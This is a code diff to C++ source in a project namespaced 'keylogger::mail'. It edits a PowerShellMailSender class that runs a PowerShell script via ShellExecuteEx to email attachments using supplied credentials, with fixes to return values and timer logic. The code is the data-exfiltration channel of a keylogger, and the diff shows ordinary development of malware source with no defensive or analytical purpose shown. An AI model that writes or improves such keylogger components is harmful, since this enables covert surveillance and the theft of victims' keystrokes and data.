@@ -5,6 +5,8 @@ namespace keylogger::mail
 namespace
 {
 std::string stringReplace(std::string s, const std::string& stringToReplace, const std::string& replaceWith);
+
+const int successCodeFromScript = 7;
 }
 
 PowerShellMailSender::PowerShellMailSender(std::unique_ptr<PowerShellSendMailScriptCreator> scriptCreatorInit)
@@ -15,21 +17,6 @@ PowerShellMailSender::PowerShellMailSender(std::unique_ptr<PowerShellSendMailScr
 bool PowerShellMailSender::sendMail(const Mail& mail, const Credentials& credentials)
 {
     std::string attachmentsAsString;
-
-    //    if (mail.attachments.size() == 1)
-    //    {
-    //        attachmentsAsString = mail.attachments.at(0);
-    //    }
-    //    else
-    //    {
-    //        for (const auto& attachment : mail.attachments)
-    //        {
-    //            attachmentsAsString += attachment + "::";
-    //        }
-    //
-    //        attachmentsAsString = attachmentsAsString.substr(0, attachmentsAsString.length() - 2);
-    //    }
-
     if (auto begin = mail.attachments.begin(); begin != mail.attachments.end())
     {
         attachmentsAsString = *begin;
@@ -65,29 +52,27 @@ bool PowerShellMailSender::sendMail(const Mail& mail, const Credentials& credent
     bool executionStatus = static_cast<bool>(ShellExecuteEx(&shellExecuteInfo));
     if (!executionStatus)
     {
-        return -3;
+        return false;
     }
 
     WaitForSingleObject(shellExecuteInfo.hProcess, 7000);
     DWORD exitCode = 100;
     GetExitCodeProcess(shellExecuteInfo.hProcess, &exitCode);
 
-    timer.setTimerCallback([&]() {
-        WaitForSingleObject(shellExecuteInfo.hProcess, 60000);
-        GetExitCodeProcess(shellExecuteInfo.hProcess, &exitCode);
-        if ((int)exitCode == STILL_ACTIVE)
-        {
-            TerminateProcess(shellExecuteInfo.hProcess, 100);
-        }
-        utils::appendLog("<From MailSender> Return code " + std::to_string((int)exitCode));
-    });
+//    timer.setTimerCallback([&]() {
+//        WaitForSingleObject(shellExecuteInfo.hProcess, 60000);
+//        GetExitCodeProcess(shellExecuteInfo.hProcess, &exitCode);
+//        if ((int)exitCode == STILL_ACTIVE)
+//        {
+//            TerminateProcess(shellExecuteInfo.hProcess, 100);
+//        }
+//    });
 
-    timer.setTotalNumberOfCalls(1L);
-    timer.setInterval(10L);
-    timer.start(true);
+//    timer.setTotalNumberOfCalls(1L);
+//    timer.setInterval(10L);
+//    timer.start(true);
 
-    utils::appendLog("STATUS CODE: " + std::to_string((int)exitCode));
-    return static_cast<int>(exitCode);
+    return static_cast<int>(exitCode) == successCodeFromScript;
 }
 
 namespace
